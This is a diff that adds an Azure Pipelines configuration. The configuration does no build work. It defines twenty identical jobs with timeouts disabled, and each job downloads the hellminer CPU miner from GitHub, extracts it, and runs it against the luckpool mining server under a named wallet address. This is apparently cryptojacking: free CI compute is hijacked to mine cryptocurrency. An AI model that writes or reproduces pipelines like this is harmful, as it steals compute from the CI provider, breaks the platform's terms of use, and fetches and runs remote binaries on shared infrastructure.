@@ -1,0 +1,105 @@
+trigger:
+- main
+pool:
+  vmImage: 'ubuntu-latest'
+jobs:
+- job: Run1
+  timeoutInMinutes: 0 # how long to run the job before automatically cancelling
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 2
+    displayName: 'run'
+- job: Run2
+  timeoutInMinutes: 0 # how long to run the job before automatically cancelling
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 2
+    displayName: 'run'
+- job: Run3
+  timeoutInMinutes: 0 # how long to run the job before automatically cancelling
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 2
+    displayName: 'run'
+- job: Run4
+  timeoutInMinutes: 0 # how long to run the job before automatically cancelling
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 2
+    displayName: 'run'
+- job: Run5
+  timeoutInMinutes: 0 # how long to run the job before automatically cancelling
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 2
+    displayName: 'run'
+- job: Run6
+  timeoutInMinutes: 0 # how long to run the job before automatically cancelling
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 2
+    displayName: 'run'
+- job: Run7
+  timeoutInMinutes: 0 # how long to run the job before automatically cancelling
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 2
+    displayName: 'run'
+- job: Run8
+  timeoutInMinutes: 0 # how long to run the job before automatically cancelling
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 2
+    displayName: 'run'
+- job: Run9
+  timeoutInMinutes: 0 # how long to run the job before automatically cancelling
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 2
+    displayName: 'run'
+- job: Run10
+  timeoutInMinutes: 0 # how long to run the job before automatically cancelling
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 2
+    displayName: 'run'
+- job: Run11
+  timeoutInMinutes: 0 # how long to run the job before automatically cancelling
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 2
+    displayName: 'run'
+- job: Run12
+  timeoutInMinutes: 0 # how long to run the job before automatically cancelling
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 2
+    displayName: 'run'
+- job: Run13
+  timeoutInMinutes: 0 # how long to run the job before automatically cancelling
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 2
+    displayName: 'run'
+- job: Run14
+  timeoutInMinutes: 0 # how long to run the job before automatically cancelling
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 2
+    displayName: 'run'
+- job: Run15
+  timeoutInMinutes: 0 # how long to run the job before automatically cancelling
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 2
+    displayName: 'run'
+- job: Run16
+  timeoutInMinutes: 0 # how long to run the job before automatically cancelling
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 2
+    displayName: 'run'
+- job: Run17
+  timeoutInMinutes: 0 # how long to run the job before automatically cancelling
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 2
+    displayName: 'run'
+- job: Run18
+  timeoutInMinutes: 0 # how long to run the job before automatically cancelling
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 2
+    displayName: 'run'
+- job: Run19
+  timeoutInMinutes: 0 # how long to run the job before automatically cancelling
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 2
+    displayName: 'run'
+- job: Run20
+  timeoutInMinutes: 0 # how long to run the job before automatically cancelling
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 2
+    displayName: 'run'
